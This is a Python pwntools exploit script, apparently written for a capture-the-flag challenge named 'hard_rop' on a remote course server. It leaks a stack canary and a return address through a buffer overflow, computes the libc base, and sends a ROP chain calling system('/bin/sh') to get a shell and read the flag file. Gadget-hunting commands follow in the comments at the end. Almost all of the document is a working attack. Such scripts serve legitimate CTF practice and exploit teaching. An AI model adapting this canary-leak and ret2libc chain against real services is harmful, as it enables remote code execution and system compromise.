from pwn import *
from pwn import u64, p64

binary = './hard_rop'
context.binary = ELF(binary)
libc = ELF('./libc.so.6')  # 指定你要用的 libc
context.log_level = 'debug'

remote_host = '140.113.207.245'
remote_port = 30176
p = remote(remote_host, remote_port)
# p = process(binary)
# p = gdb.debug(binary, gdbscript='''
#     b *0x12d2  # call read@plt inside awesome()
#     c
# ''')


# Receive the initial prompt
p.recvuntil(b"Input something awesome: ")

# ============================================
# =============== Leak Canary ================
# ============================================
time.sleep(1)
# send payload1
payload1 = b'A' * 25
p.send(payload1)
log.success(f"Sent payload1: {payload1}")

# wait for canary
p.recvuntil(payload1)

# receive canary
leaked_canary = p.recv(7)
log.info(f"Leaked Canary: {leaked_canary}")
canary = u64(b'\x00' + leaked_canary)
log.success(f"Leaked Canary: {hex(canary)}")

# restore canary
p.recvuntil(b"Input: ")
ctrl_z = b'A' * 24 + p64(canary)
p.send(ctrl_z)
log.success(f"\033[90mSent ctrl_z: {ctrl_z}\033[0m")

# ===================================================
# =============== Leak Return Address ===============
# ===================================================
time.sleep(1)
# send payload2
p.recvuntil(b"Input something awesome: ")
payload2 = b"A" * 24 + b"B" * 16  # Overwrite up to return address
p.send(payload2)
log.success(f"Sent payload2: {payload2}")

# receive return address
ret_addr_with_msg = p.recvline()
log.info(f"RECV: {ret_addr_with_msg}")
leaked_ret = ret_addr_with_msg[len(b'CSC2025 and ') + len(payload2) : -len(b" are awesome!!! Let's give you another overflow :)\n")]
log.success(f"Leaked Return Address bytes: {leaked_ret}")
leaked_ret_addr = u64(leaked_ret.ljust(8, b'\x00'))
log.success(f"Leaked Return Address: {hex(leaked_ret_addr)}")

# restore canary and return addr
p.recvuntil(b"Input: ")
ctrl_z = b'A' * 24 + p64(canary) + b"C" * 8 + p64(leaked_ret_addr)
p.send(ctrl_z)
log.success(f"\033[90mSent ctrl_z: {ctrl_z}\033[0m")


# ===================================================
# =============== Basic Payload =====================
# ===================================================
time.sleep(1)
payload_basic = b"A" * 24  # Fill buffer
payload_basic += p64(canary)  # Insert the correct canary
payload_basic += b"B" * 8  # Overwrite saved RBP
payload_basic += p64(leaked_ret_addr)  # Overwrite return address


# ===================================================
# ================= Leak libc_base ==================
# ===================================================
time.sleep(1)
'''
p.recvuntil(b"Input something awesome: ")
payload3 = b"A" * 256 + b"B" * 8
p.send(payload3)
log.success(f"Sent payload3: {payload3}")

# receive libc_base
leaked_libc_base = p.recvline()
log.info(f"RECV: {leaked_libc_base}")
libc_base_addr = leaked_libc_base[len(b'CSC2025 and ') + 256 : -len(b" are awesome!!! Let's give you another overflow :)\n")]
log.info(f"Leaked libc_base: {libc_base_addr}")
libc_base_addr = u64(libc_base_addr.ljust(8, b'\x00'))
log.success(f"Leaked libc_base: {hex(libc_base_addr)}")

# restore canary and return addr
p.recvuntil(b"Input: ")
ctrl_z = b'A' * 24 + p64(canary) + b"C" * 8 + p64(leaked_ret_addr)
p.send(ctrl_z)
log.success(f"\033[90mSent ctrl_z: {ctrl_z}\033[0m")
'''
p.recvuntil(b"Input something awesome: ")
payload2 = b"A" * 72
p.send(payload2)
log.success(f"Sent payload2: {payload2}")

# receive return address
ret_addr_with_msg = p.recvline()
log.info(f"RECV: {ret_addr_with_msg}")
leaked_ret = ret_addr_with_msg[len(b'CSC2025 and ') + len(payload2) : -len(b" are awesome!!! Let's give you another overflow :)\n")]
log.success(f"Leaked Return Address bytes: {leaked_ret}")
leaked_ret_addr = u64(leaked_ret.ljust(8, b'\x00'))
log.success(f"Leaked Return Address: {hex(leaked_ret_addr)}")

# calculate libc_base
offset_to_libc_base = 0x02a150 + 122  # example if return addr from __libc_start_main+122

libc_base = leaked_ret_addr - offset_to_libc_base
log.success(f"Libc base: {hex(libc_base)}")

pop_rdi_ret   = libc_base + 0x0000000000010f75b
ret_gadget    = libc_base + 0x0000000000002882f
bin_sh_gadget = libc_base + 0x000000000001cb42f
system_gadget = libc_base + 0x00000000000058750

p.recvuntil(b"Input: ")
p.send(ctrl_z)
log.success(f"\033[90mSent ctrl_z: {ctrl_z}\033[0m")

p.recvuntil(b"Input something awesome: ")
payload = b"A" * 24 + p64(canary) + p64(leaked_ret_addr) + p64(ret_gadget) + p64(pop_rdi_ret) + p64(bin_sh_gadget) + p64(system_gadget)
p.send(payload)
log.success(f"Sent payload: {payload}")
log.critical(f"leaked_ret_addr: {hex(leaked_ret_addr)}")
log.critical(f"return to main: {hex(leaked_ret_addr - 122)}")
log.critical(f"Libc base: {hex(libc_base)}")


time.sleep(1)
p.sendline(b'cat flag.txt')

time.sleep(1)
p.recvuntil(b"Input: ")
p.sendline(b'cat flag.txt')
flag = p.recvline()[:-1].decode().strip()
log.success(f"\033[93;1mFlag: {flag}\033[0m")
p.close()


# ===================================================
# objdump -d ./hard_rop
# ROPgadget --binary ./libc.so.6 --only 'pop|ret' | grep -E 'rdi|rsi|rdx|rax'
# ROPgadget --binary ./libc.so.6 --string '/bin/sh'
# ROPgadget --binary ./libc.so.6 --only 'syscall'


# ROPgadget --binary ./libc.so.6 | grep "pop rdi ; ret"
# ROPgadget --binary ./libc.so.6  --only ret
# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"
# nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep " system"
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 | grep "pop rdi ; ret"
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6  --only ret